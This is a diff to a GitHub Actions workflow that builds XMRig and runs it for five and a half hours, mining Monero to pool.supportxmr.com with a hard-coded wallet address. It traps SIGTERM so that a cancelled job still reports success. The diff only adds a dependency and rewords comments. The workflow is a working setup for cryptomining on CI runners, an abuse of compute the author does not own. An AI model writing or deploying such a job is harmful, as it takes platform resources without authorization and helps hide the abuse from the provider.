@@ -13,7 +13,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt install -y build-essential git cmake libssl-dev libhwloc-dev
+          sudo apt install -y build-essential git cmake libssl-dev libhwloc-dev libuv1-dev
 
       - name: Clone XMRig
         run: git clone https://github.com/xmrig/xmrig.git
@@ -29,10 +29,10 @@ jobs:
         run: |
           cd xmrig/build
 
-          # Graceful handling of SIGTERM to prevent workflow failure
+          # Trap SIGTERM for clean shutdown
           trap "echo 'Job canceled, exiting successfully'; exit 0" SIGTERM
 
-          # Run XMRig for 5.5 hours (19800 seconds)
+          # Run miner with a timeout of 19800 seconds (5h 30m)
           timeout 19800s ./xmrig \
             -o pool.supportxmr.com:7777 \
             -u 44SpTnkYyc9NmH3QjJkoLtVc3DXXJGwfD7tvhF1zwNRz9JbAMeHNiCD4wb8ivNvo3edgrntc3ra1meA5uZhT3vbaJ1ApPT1 \
